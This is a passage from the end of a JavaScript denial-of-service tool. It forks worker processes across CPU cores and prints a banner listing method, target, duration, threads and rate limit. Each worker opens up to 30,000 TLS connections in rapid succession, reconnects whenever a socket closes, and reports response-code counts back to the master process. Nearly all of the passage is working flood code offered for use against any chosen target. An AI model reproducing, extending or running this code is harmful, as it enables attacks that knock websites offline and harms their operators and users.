        // statuses["CONNS"]--;

        if (tlsSocket) {
            tlsSocket.end(() => tlsSocket.destroy());
            go();
        }
    })

}

if (cluster.isMaster) {
    const workers = {};

    Array.from({ length: threads }, (_, i) => cluster.fork({ core: i % os.cpus().length }))
    console.log(`
        ${'________'.yellow.bold}${'o8A888888o_'.grey.bold}
       ${'_o8888888888'.yellow}${'88'.grey.bold}${'K_]'.bgBlack.white.bold}${'888888o'.grey.bold}
                  ${'~~~'.yellow}${'+8888888888o'.grey.bold}
                      ${'~8888888888'.grey.bold}
                      ${'o888'}${'88888888'.grey.bold}
                     ${'o88888'}${'88888888'.grey.bold}
                   ${'_888888888'}${'8888888'.grey.bold}
                  ${'o88888888888'}${'8888888_'.grey.bold}
                 ${'o8888888888888'}${'8888888_'.grey.bold}
                ${'_88888888888888'}${'88888888_'.grey.bold}
                ${'8888888888888888'}${'88888888_'.grey.bold}
                ${'8888888888888888'}${'888888888'.grey.bold}
                ${'8888888888888888'}${'8888888888'.grey.bold}
                ${'8888888888888888'}${'8888888888'.grey.bold}
                ${'888888888888888'}${'8'.white.bold}${'88888888888'.grey.bold}
                ${'~88888888888888'}${'88'.white.bold}${'8888888888_'.grey.bold}
                 ${'(888888888888'}${'8888'.white.bold}${'8888888888'.grey.bold}
                  ${'888888888888'}${'88888'.white.bold}${'8888888888'.grey.bold}
                   ${'8888888888'}${'88888888'.white.bold}${'888888888_'.grey.bold}
                   ${'~88888888'}${'888888888888'.white.bold}${'88888888'.grey.bold}
                     ${'+888888'}${'8888888888888'.white.bold}${'8~~~~~'.grey.bold}
                      ${'~=88'}${'8888888888888888o'.white.bold}
               ${'_=oooooooo'.yellow.bold}${'8888888888888888'.white.bold}${'88'.white}
                ${'_o88=8888='.yellow.bold}=~${'88888888'.yellow.bold}===8${'888_'.white}    ${'@benshii'.cyan.underline}
                ${'~'.yellow.bold}   ${'=~~'.yellow.bold} ${'_o88888888='.yellow.bold}      ~~~   ${new Date().toLocaleString("us")}
                        ${'~ o8=~88=~'.yellow.bold}


-> ${'Method'.white.bold}${':'.red.bold} [${'HTTP'.bold}${reqmethod.bold}]
-> ${'Target'.white.bold}${':'.red.bold} [${target.bold.underline}]
-> ${'Time'.white.bold}${':'.red.bold} [${`${time}`.bold} ${'seconds'.bold}]
-> ${'Threads'.white.bold}${':'.red.bold} [${`${threads} cores`.bold}]
-> ${'Ratelimit'.white.bold}${':'.red.bold} [${`${ratelimit} rq/s`.bold}]
-> ${'Debug'.white.bold}${':'.red.bold} [${debug === true ? 'true'.green.bold : debug === false ? 'false'.red.bold : 'false'.red.bold}]
`);

    function shutdown() {
        const workerIds = Object.keys(cluster.workers);

        workerIds.forEach((id) => {
            if (cluster.workers[id]) {
                cluster.workers[id].on('exit', () => {
                    if (Object.keys(cluster.workers).length === 0) {
                        process.exit();
                    }
                });
                cluster.workers[id].kill('SIGTERM');
            }
        });

        if (workerIds.length === 0) {
            process.exit();
        } else {
            process.exit();
        }
    }

    process.on('SIGINT', shutdown);
    process.on('SIGTERM', shutdown);
    process.on('SIGTSTP', () => {
        shutdown();
    });

    cluster.on('exit', (worker, code, signal) => {
        if (signal !== 'SIGTERM' && signal !== 'SIGINT' && signal !== 'SIGTSTP') {
            cluster.fork({ core: worker.id % os.cpus().length });
        }
    });

    cluster.on("message", (worker, message) => {
        workers[worker.id] = [worker, message];
    });

    if (debug) {
        setInterval(() => {
            let statuses = {};
            // let proxystats = {};
            for (let w in workers) {
                // console.log(w);
                // console.log(workers[w][0]);
                if (workers[w][0].state === "online") {
                    // console.log(workers[w]);
                    for (let st of workers[w][1]) {
                        for (let code in st) {
                            if (!statuses[code]) statuses[code] = 0;
                            statuses[code] += st[code];
                            // if (!proxystats[code]) proxystats[code] = 0;
                            // proxystats[code] += st[code];
                        }
                    }
                } else {
                    // console.log(`worker state: ${workers[w][0].state}`);
                }
            }
            // console.clear();
            console.log(new Date().toLocaleString("us"), statuses);
            // console.log(`proxystats: ${proxystats}`)
        }, 1000);
    }

    setTimeout(() => process.exit(1), time * 1000);
} else {
    let conns = 0;

    let i = setInterval(() => {
        if (conns < 30000) {
            conns++;
        } else {
            clearInterval(i);
            return;
        }
        go();
    }, 1);

    if (debug) {
        setInterval(() => {
            // if (statusesQ.length >= 4) statusesQ.shift();
            statusesQ.push(statuses);
            // if (proxystatsQ.length >= 4) proxystatsQ.shift();
            // proxystatsQ.push(proxystats);
            // statuses = {};
            // console.log(`statuses: ${statuses}, proxystats: ${proxystats}`);
            try {
                if (process.connected) {
                    process.send(statusesQ);
                    // process.send(statusesQ)
                }
            } catch (err) {
                console.log(err);
            }
        }, 250);
    }

    setTimeout(() => process.exit(1), time * 1000);
}